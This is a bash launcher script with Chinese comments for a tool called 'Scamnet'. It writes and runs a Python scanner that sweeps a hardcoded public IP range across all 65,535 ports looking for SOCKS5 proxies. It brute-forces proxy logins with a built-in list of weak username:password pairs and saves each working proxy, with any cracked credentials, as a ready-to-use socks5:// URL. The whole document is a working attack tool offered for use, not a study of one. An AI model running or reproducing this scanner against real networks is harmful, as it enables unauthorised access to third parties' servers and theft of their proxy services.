#!/bin/bash
# main.sh - Scamnet OTC SOCKS5 全端口扫描器（终极稳定版 v2.5 - 语法修复）
# 修复：Python 语法错误（; 语句链）
set -e

RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }

echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.5 (全端口 1-65535 - 语法修复)${NC}"
echo "日志 → $LOG"

# ==================== 依赖安装 ====================
if [ ! -f ".deps_installed" ]; then
    echo -e "${YELLOW}[*] 安装依赖...${NC}"
    if ! command -v pip3 &>/dev/null; then
        if command -v apt >/dev/null; then apt update -qq && apt install -y python3-pip; fi
        if command -v yum >/dev/null; then yum install -y python3-pip; fi
        if command -v apk >/dev/null; then apk add py3-pip; fi
    fi
    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple \
        requests tqdm PyYAML ipaddress 2>&1 | tee -a "$LOG"
    touch .deps_installed
    log "依赖安装完成"
else
    log "依赖已安装"
fi

# ==================== config.yaml ====================
cat > config.yaml << 'EOF'
range: "157.254.32.0-157.254.52.255"
ports: !range 1-65535
timeout: 6.0
workers: 300
EOF
log "config.yaml 已创建"

# ==================== scanner.py（语法修复）================
cat > scanner.py << 'PY'
import sys, os; sys.path.append(os.path.dirname(__file__))
import yaml
from yaml import SafeLoader
from plugins import load_plugins
from concurrent.futures import ThreadPoolExecutor
import socket, ipaddress, threading, time
from tqdm import tqdm

def range_constructor(loader, node):
    value = loader.construct_scalar(node)
    start, end = map(int, value.split('-'))
    return list(range(start, end + 1))
yaml.add_constructor('!range', range_constructor, Loader=SafeLoader)

with open('config.yaml') as f:
    cfg = yaml.load(f, Loader=SafeLoader)

INPUT_RANGE = cfg['range']
RAW_PORTS = cfg['ports']
TIMEOUT = cfg.get('timeout', 6.0)
MAX_WORKERS = cfg.get('workers', 300)

if isinstance(RAW_PORTS, list):
    PORTS = RAW_PORTS
else:
    print(f"[!] 端口解析失败，使用默认 [1080]")
    PORTS = [1080]

print(f"[DEBUG] 端口数量: {len(PORTS)} (期望: 65535)")

file_lock = threading.Lock()
valid_count = 0
progress_lock = threading.Lock()
plugins = load_plugins()

def safe_update(pbar):
    with progress_lock:
        pbar.update(1)

def test_proxy(ip: str, port: int, pbar):
    try:
        result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
        ok, lat, exp = is_socks5_available(ip, port, None, None)
        if ok:
            c = get_country(exp) or get_country(ip)
            result.update({'status':'OK', 'country':c, 'latency':f'{lat}ms', 'export_ip':exp})
        else:
            auth_mod = plugins.get('auth_weak')
            if auth_mod:
                auth = auth_mod.brute(ip, port)
                if auth:
                    u, p = auth
                    ok, lat, exp = is_socks5_available(ip, port, u, p)
                    if ok:
                        c = get_country(exp) or get_country(ip)
                        result.update({'status':'OK (Weak)', 'country':c, 'latency':f'{lat}ms', 'export_ip':exp, 'auth':f'{u}:{p}'})
        plugins['output_file'].save_detail(result)
        if result['status'].startswith('OK'):
            with file_lock:
                global valid_count
                valid_count += 1
            plugins['output_file'].save_valid(result)
    except Exception:
        pass
    finally:
        safe_update(pbar)

def get_country(ip):
    try:
        for n in ['geo_ipapi']:
            if n in plugins and (c:=plugins[n].get(ip)): return c
    except: pass
    return 'XX'

def is_socks5_available(ip, port, u=None, p=None):
    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT) as s:
            s.settimeout(TIMEOUT)
            m = b'\x05\x02\x00\x02' if u and p else b'\x05\x01\x00'
            s.sendall(m)
            r = s.recv(2)
            if len(r) != 2 or r[0] != 5: return False, 0, None
            if r[1] == 0: pass
            elif r[1] == 2 and u and p:
                a = b'\x01' + bytes([len(u)]) + u.encode() + bytes([len(p)]) + p.encode()
                s.sendall(a)
                auth_resp = s.recv(2)
                if auth_resp[1] != 0: return False, 0, None
            else: return False, 0, None
            t = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
            s.sendall(b'\x05\x01\x00\x01' + t)
            conn_resp = s.recv(10)
            if conn_resp[1] != 0: return False, 0, None
            s.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n')
            resp = b''
            st = time.time()
            while time.time() - st < TIMEOUT:
                try:
                    c = s.recv(1024)
                    if not c: break
                    resp += c
                    if b'\r\n\r\n' in resp: break
                except: break
            if b'\r\n\r\n' in resp:
                exp = resp.split(b'\r\n\r\n', 1)[1].decode(errors='ignore').split()[0]
            else:
                exp = 'Unknown'
            return True, round((time.time() - st) * 1000), exp
    except: return False, 0, None

def main():
    print('[OTC] 扫描启动')
    start_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0]))
    end_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))
    ips = [str(ipaddress.IPv4Address(i)) for i in range(start_ip, end_ip + 1)]
    total = len(ips) * len(PORTS)
    print(f'IP: {len(ips):,}, 端口: {len(PORTS):,}, 总任务: {total:,}')

    pbar = tqdm(total=total, desc='扫描', unit='port', ncols=100)

    def worker(ip, port):
        test_proxy(ip, port, pbar)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
        for ip in ips:
            for port in PORTS:
                exe.submit(worker, ip, port)
        exe.shutdown(wait=True)

    pbar.close()
    print(f'\n[+] 完成！发现 {valid_count} 个可用代理')

if __name__ == '__main__': main()
PY
log "scanner.py 已写入（语法修复）"

# ==================== 插件 ====================
mkdir -p plugins
cat > plugins/__init__.py << 'PY'
import importlib, os
def load_plugins():
    p = {}
    path = os.path.dirname(__file__)
    for f in os.listdir(path):
        if f.endswith('.py') and f != '__init__.py':
            n = f[:-3]
            p[n] = importlib.import_module(f'plugins.{n}')
    return p
PY

cat > plugins/auth_weak.py << 'PY'
WEAK_PASSWORDS = [
        "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
    "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
    "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888", 
  "test123:test123", "qwe:qwe", "qwer:qwer", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
  "12349:12349", "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
]
def brute(ip, port):
    from scanner import is_socks5_available, TIMEOUT
    for pair in WEAK_PASSWORDS:
        u, p = pair.split(':')
        ok, _, _ = is_socks5_available(ip, port, u, p)
        if ok: return u, p
    return None
PY

cat > plugins/geo_ipapi.py << 'PY'
import requests
def get(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=6)
        if r.status_code == 200:
            c = r.json().get('countryCode','').strip().upper()
            if len(c) == 2 and c.isalpha(): return c
    except: pass
    return None
PY

cat > plugins/output_file.py << 'PY'
import threading
file_lock = threading.Lock()
valid_count = 0
def save_detail(r):
    line = f'{r["ip"]}:{r["port"]} | {r["status"]} | {r["country"]} | {r["latency"]} | {r["export_ip"]} | {r["auth"]}'
    with file_lock:
        with open('result_detail.txt', 'a', encoding='utf-8') as f:
            f.write(line + '\n')
def save_valid(r):
    global valid_count
    valid_count += 1
    auth = r["auth"]
    fmt = f'socks5://{auth}@{r["ip"]}:{r["port"]}#{r["country"]}' if auth else f'socks5://{r["ip"]}:{r["port"]}#{r["country"]}'
    with file_lock:
        with open('socks5_valid.txt', 'a', encoding='utf-8') as f:
            f.write(fmt + '\n')
    print(f'[+] 发现 #{valid_count}: {fmt}')
PY

log "所有插件已创建"

# ==================== 初始化 & 启动 ====================
echo "# Scamnet 日志 $(date)" > result_detail.txt
echo "# socks5://..." > socks5_valid.txt

echo -e "${GREEN}[*] 启动扫描...${NC}"
python3 scanner.py 2>&1 | tee -a "$LOG"

VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
echo -e "${GREEN}[+] 完成！发现 ${VALID} 个代理${NC}"
